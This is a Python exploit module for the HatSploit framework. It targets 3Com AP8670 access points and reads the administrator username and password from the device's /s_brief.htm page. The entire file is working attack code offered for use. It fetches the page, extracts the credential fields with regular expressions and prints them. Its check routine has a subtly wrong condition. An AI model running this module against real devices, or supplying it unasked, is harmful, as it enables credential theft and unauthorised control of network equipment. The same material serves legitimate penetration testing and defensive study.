"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import re

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import HTTP


class HatSploitModule(Module, HTTP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "3Com AP8670 Credentials Disclosure",
            'Module': "exploit/linux/3com/ap8670_credentials_disclosure",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
                "Richard Brain - vulnerability researcher",
            ],
            'Description': """
                Module attempts to exploit a vulnerability that exists in 3Com AP8670
                and fetch credentials for administrator account.
            """,
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'DisclosureDate': "2018-05-11",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [],
                'SideEffects': [],
            }
        })

    def check(self):
        response = self.http_request(
            method="GET",
            path='/s_brief.htm'
        )

        if not response and response.status_code != 200:
            return False

        return True

    def run(self):
        response = self.http_request(
            method="GET",
            path='/s_brief.htm'
        )

        username = re.findall(
            '<input type="text" name="szUsername" size=16 value="(.+?)">', response.text
        )
        password = re.findall(
            '<input type="password" name="szPassword" size=16 maxlength="16" value="(.+?)">',
            response.text,
        )

        if username and password:
            self.print_table(
                "Credentials", ('Username', 'Password'), (username, password)
            )
        else:
            self.print_warning("Target vulnerable, but no credentials found.")
